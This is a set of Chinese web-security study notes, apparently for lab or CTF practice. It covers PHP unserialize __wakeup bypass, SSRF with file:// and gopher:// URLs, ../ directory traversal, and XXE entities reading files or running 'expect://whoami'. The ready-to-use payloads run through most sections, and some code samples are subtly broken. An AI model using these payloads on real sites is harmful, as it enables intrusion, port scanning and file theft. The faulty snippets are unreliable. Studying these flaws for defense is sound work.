反序列化时不需要new，也不需要通过类，所以魔术方法可以不会输出。



### 关于利用php的类

#### 魔术方法——构造函数、析构函数、wake_up

```php+HTML
<?php
//定义一个people类
class people{
	public $name = 'default name';      //类的变量
    
    //构造函数，new类的时候使用——输出默认值——调用类时在做事情之前调用——反序列化时不需要new，也不需要通过类，所以不会输出
    function__construct(){
        echo $this->name.' is construct<br/>';
    }
    
    //析构函数，事情做完了之后调用，类不需要用时。————反序列化时不需要new，但需要通过类的名，所以会调用析构函数——先进后出
    function__desturct(){
        echo $this->name.' is desturct<br/>';
    }
    
    //反序列化函数执行后马上会调用
    function__wakeup(){
         echo $this->name.' is wakeup<br/>';
    }
   
	
	function shuohua(){
		echo 'wo jiao'.$this->name.'<br/>';    //类的函数，不是变量
	}
}

$ren1 = new people();   //实例化一个类，初始化
$ren1->name = 'xiaoming';     //也可以给这个变量命名，赋值
$ren1->shuohua();   //调用类中的方法

/*echo serialize($ren1);    //序列化
echo <br/>;*/

$ren2 = unserialize('O:6:"people":1:{s:4:"name";s:8:"xiaohong";}');     //反序列化
$ren2->shuohua();

?>

//输出会得到：
default name is construct
wo jiao xiaoming
xiaohong is wakeup
wo jiao xiaohong
xiaohong is construct
xiaoming is construct
```



```php
<?php

//序列化和反序列化

class people{
	//类变量
	public $name;
	public $age;

	//构造函数，new类时候自动调用
	function __construct(){
		echo '构造函数被调用了<br/>';
	}

	//析构函数，事情做完之后调用
	function __destruct(){
		echo '析构函数调用<br/>';
	}

	//反序列化之后立马调用的函数
	function __wakeup(){
		echo '有东西被反序列化啦<br/>';
	}


	//类函数
	function shuohua(){
		echo 'wo jiao '.$this->name." jin nian ".$this->age." sui<br/>";
	}
}

/*
//初始化类
$ren1 = new people();
//给类变量赋值
$ren1->name="xiaoming";
$ren1->age = 20;
//使用类方法
$ren1->shuohua();


//把ren1进行序列化
$xuliehua_ren1 = serialize($ren1);
//O:6:"people":2:{s:4:"name";s:8:"xiaoming";s:3:"age";i:20;}
echo $xuliehua_ren1.'<br/>';
*/

//反序列化
$str1 = 'O:6:"people":2:{s:4:"name";s:8:"xiaoming";s:3:"age";i:20;}';
$copy_ren1 = unserialize($str1);

$copy_ren1->shuohua();

?>
```





## 反序列化触发——防火墙一般在wake_up处启动

```php+HTML
<?php
//定义一个people类
class people{
	public $name = 'default name';      //类的变量
    
    //构造函数，new类的时候使用——输出默认值——调用类时在做事情之前调用——反序列化时不需要new，也不需要通过类，所以不会输出
    function__construct(){
        echo $this->name.' is construct<br/>';
    }
    
    //析构函数，事情做完了之后调用，类不需要用时。————反序列化时不需要new，但需要通过类的名，所以会调用析构函数——先进后出
    function__desturct(){
        echo $this->name.' is desturct<br/>';
    }
    
    //反序列化函数执行后马上会调用——可能做一些防火墙过滤使用
    function__wakeup(){
         echo $this->name.' is wakeup<br/>';
    }
   
	
	function shuohua(){
		echo 'wo jiao'.$this->name.'<br/>';    //类的函数，不是变量
	}
}

/*$ren1 = new people();   //实例化一个类，初始化
$ren1->name = 'xiaoming';     //也可以给这个变量命名，赋值
$ren1->shuohua();   //调用类中的方法
*/
/*echo serialize($ren1);    //序列化
echo <br/>;*/

/*$ren2 = unserialize('O:6:"people":1:{s:4:"name";s:8:"xiaohong";}');     //反序列化*/

$ren2 = unserialize($_GET['x']);
$ren2->shuohua();

?>
```

此时可以互动：提交

`?x=O:6:"people":1:{s:4:"name";s:8:"xiaohong";}`

然后就可能产生漏洞：

**绕过防火墙让它直接调用destruct析构函数进行保存。**



如果把**类的变量个数**修改为2【变大】：

`?x=O:6:"people":2:{s:4:"name";s:8:"xiaohong";}`

此时wakeup没有了但是destruct还在。绕过防火墙但是析构函数启动。

如果把**类的变量自己字符个数**修改：

发现是`default name is destruct`，即变回默认值并启动析构函数。



```php+html
<?php

//序列化和反序列化
class people{
	//变量
	public $name;
	public $age;
	public $job;

	//构造函数,new的时候自动调用
	function __construct(){
		echo '构造函数启动<br/>';
	}

	//析构函数，事情做完了之后调用
	function __destruct(){
		echo '析构函数调用<br/>';
		echo '没问题，保存进度<br/>';
	}

	//反序列化自动调用
	function __wakeup(){
		echo '反序列化启动<br/>';
		echo '防火墙启动，不要乱来<br/>';
	}

	//类函数
	function shuohua(){
		echo 'wo jiao '.$this->name.' nian ling '.$this->age.' sui job is '.$this->job.'<br/>';
	}

}

/*
//初始化
$ren1 = new people();
$ren1->name = "xiaoming";
$ren1->age = 20;
$ren1->job = "driver";
$ren1->shuohua();

//序列化
$code = serialize($ren1);
//O:6:"people":3:{s:4:"name";s:8:"xiaoming";s:3:"age";i:20;s:3:"job";s:6:"driver";}
echo $code.'<br/>';
*/


//当传入的需要反序列化的字符串，有多少个参数的位置，发生错误，wakeup不会启动
$str1 = 'O:6:"people":3:{s:4:"name";s:8:"xiaoming";s:3:"age";i:20;s:3:"job";s:6:"driver";}';
$copy_ren1 = unserialize($str1);
$copy_ren1->shuohua();


?>
```





### 可以总结：

当**反序列化的变量的个数不对**，那么`__wakeup`就不会执行，直接执行`__destruct`

那么如果要带私货：就可以放在`"xiaohong"`里面，即**变量的键对应的值**里。



假设有防火墙：

```php+HTML
<?php
//定义一个people类
class people{
	public $name = 'default name';      //类的变量
    
    //构造函数，new类的时候使用——输出默认值——调用类时在做事情之前调用——反序列化时不需要new，也不需要通过类，所以不会输出
    function__construct(){
        echo $this->name.' is construct<br/>';
    }
    //析构函数，事情做完了之后调用，类不需要用时。————反序列化时不需要new，但需要通过类的名，所以会调用析构函数——先进后出
    function__desturct(){
        echo $this->name.' is desturct<br/>';
        echo $this->name.'被写入到了php文件中';
    }
    //反序列化函数执行后马上会调用
    function__wakeup(){
        $this->name = '防火墙阻止了你乱来';
         echo $this->name.' is wakeup<br/>';
    }
   
	
	function shuohua(){
		echo 'wo jiao'.$this->name.'<br/>';    //类的函数，不是变量
	}
}

/*$ren1 = new people();   //实例化一个类，初始化
$ren1->name = 'xiaoming';     //也可以给这个变量命名，赋值
$ren1->shuohua();   //调用类中的方法
*/
/*echo serialize($ren1);    //序列化
echo <br/>;*/

/*$ren2 = unserialize('O:6:"people":1:{s:4:"name";s:8:"xiaohong";}');     //反序列化*/

$ren2 = unserialize($_GET['x']);
$ren2->shuohua();

?>
```

如果有防火墙代码，那么就可以绕过防火墙去加自己的东西比如一句话木马。

当牵涉到大型数据传输时，可能使用到反序列化和序列化。



## 关于类的不同属性：

### 序列化：——个数会变【有些字符机器可见但是人类不可见】

**protected属性序列化之后**
`%00*%00名字`

**private属性序列化之后**
`%00类名%00名字`

### 反序列化时输入：

![image-20220120151912860](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/10%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20220120151912860.png)

```php+HTML
<?php

//序列化和反序列化
class people{
	//变量
	public $name;
	protected $age = 20;
	private $job = "driver";

	//构造函数,new的时候自动调用
	function __construct(){
		echo '构造函数启动<br/>';
	}

	//析构函数，事情做完了之后调用
	function __destruct(){
		echo '析构函数调用<br/>';
		echo '没问题，保存进度<br/>';
	}

	//反序列化自动调用
	function __wakeup(){
		echo '反序列化启动<br/>';
		echo '防火墙启动，不要乱来<br/>';
	}

	//类函数
	function shuohua(){
		echo 'wo jiao '.$this->name.' nian ling '.$this->age.' sui job is '.$this->job.'<br/>';
	}

}


//初始化
/*
$ren1 = new people();
$ren1->name = "xiaoming";
$ren1->shuohua();
*/

//序列化
//O:6:"people":3:{s:4:"name";s:8:"xiaoming";s:3:"age";i:20;s:3:"job";s:6:"driver";}
//O:6:"people":3:{s:4:"name";s:8:"xiaoming";s:6:"*age";i:20;s:11:"peoplejob";s:6:"driver";}
/*
protected属性序列化之后
%00*%00名字

private属性序列化之后
%00类名%00名字
*/
/*
$code = serialize($ren1);
echo $code.'<br/>';
*/


/**/
//当传入的需要反序列化的字符串，有多少个参数的位置，发生错误，wakeup不会启动
//$str1 = 'O:6:"people":3:{s:4:"name";s:8:"xiaoming";s:6:"%00*%00age";i:20;s:11:"%00people%00job";s:6:"driver";}';

///s.php?str1=O:6:"people":3:{s:4:"name";s:8:"xiaoming";s:6:"%00*%00age";i:20;s:11:"%00people%00job";s:6:"driver";}
$copy_ren1 = unserialize($_GET['str1']);
$copy_ren1->shuohua();


?>
```







## 反序列化与XSS

![image-20220120011409919](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/10%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20220120011409919.png)

正确流程：

本地上写序列化：

![image-20220120011516453](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/10%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20220120011516453.png)

然后访问：

![image-20220120011539838](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/10%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20220120011539838.png)

代入代码分析：

![image-20220120011641879](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/10%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20220120011641879.png)

【p标签会触发一个xss代码】

复制到url的post提交：

![image-20220120011718685](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/10%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20220120011718685.png)

然后即可触发



## 总结：

凡是以后看到反序列化的题目：

1. 看到/推理出人家的源码

   放到自己的php里，进行序列化

2. 看看对方反序列化是拿来干嘛的

   如果是为了跳过__wekeup函数，就把变量数量改变，变量内容加上自己的私货即可。

   如果是为了显示东西，按照标准的反序列化来就行。









# SSRF



## curl

linux中用于获取文件——请求地址——不仅可以访问外地端口也可以访问本地端口。

可以尝试使用伪协议：

`.php?url=file:///D://haha.txt`

如果代码使用curl进行连接资源，就可以使用伪协议。



或者尝试：

`.php?url=gopher://127.0.0.1:端口`

可以访问相关端口

——可以使用这种方法去探测别人的一些端口



## file_get_content

`.php?file=php:filter//read=convert.base64-encode/resource=ssrf.php`

如果可以，那就相当于文件包含的使用，可以利用。





# 12 目录遍历

目录遍历：

和文件包含很类似



`/dir_list.php?title=../`

`/dir_list.php?title=../../`

`/dir_list.php?title=../../../`

有可能会出现文件夹的图案，让人可以知道网站的目录结构





# xxe

XML格式——可以在Apache、Nginx上用——远古的记录问题/信息传递的方式

>XXE漏洞的概念:XXE漏洞全称XML External Entity Injection
>
>php使用xxe时可能产生的漏洞。
>
>即**xml外部实体注入**漏洞，XXE漏洞发生在应用程序解析XML输入时，**没有禁止外部实体的加载**，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害,xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行**过滤**，导致可上传恶意xml文件（**总结起来大致涉及两个点:第一:解析XML输入时没有禁止外部实体加载，第二:没有对XML文件进行过滤，导致可以传非正常文件**）



标准格式测试xxe漏洞：

```xml
</?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
<!ENTITY xxe SYSTEM "file:///D:/a.txt" >]>
<user>
	<username>&xxe;</username>
    <password>b</password>
</user>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
<!ENTITY xxe SYSTEM "file:///c:/a.txt" >]>
<user>
<username>&xxe;</username>
<password>b</password>
</user>
```



通过抓包修改填写标准格式内容，得到反馈就可以发现有xxe漏洞。





## linux里：

```
<?xml version="1.0" ?>
<!DOCTYPE GVI [
<!ENTITY xxe SYSTEM "expect://whoami">]>
<user>
<username>&xxe;</username>
<password>b</password>
</user>

```

可以执行系统命令






# ssrf

新靶场ssrf

## curl()

用于获取对方服务器内容。

linux中用于获取文件——请求地址——不仅可以访问外地端口也可以访问本地端口。借助本地网站名义去访问别的网站，但只会把前端代码请求下来。

**curl系列函数，让php代码可以去访问其他人。**【中间商】



**但同时，能通过file伪协议`url=file:///c:/a.txt`反过来被访问本地文件等。**

`url=127.0.0.1:80`、`url=127.0.0.1:3306`可以扫描端口，因此也可以被反向利用这个网站，变成黑客的**端口扫描器**。







# ssrf+xxe：

1. 在xxe漏洞出现的地方，已经触发漏洞的整个request数据包，右键urlencode两次，复制。

xxe抓包后把数据包整个进行：

![image-20220120161745189](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/15%20xxe%2Bssrf.assets/image-20220120161745189.png)

两次编码。



2. 打开ssrf漏洞出现的地方，

`url=gopher://xxe.com:80/_[一堆刚刚复制的urlencode过的东西]`

利用gopher伪协议：

信息查找，tcp/ip，可以做tcp stream数据流的事情

可以利用来跳过http被屏蔽的情况。





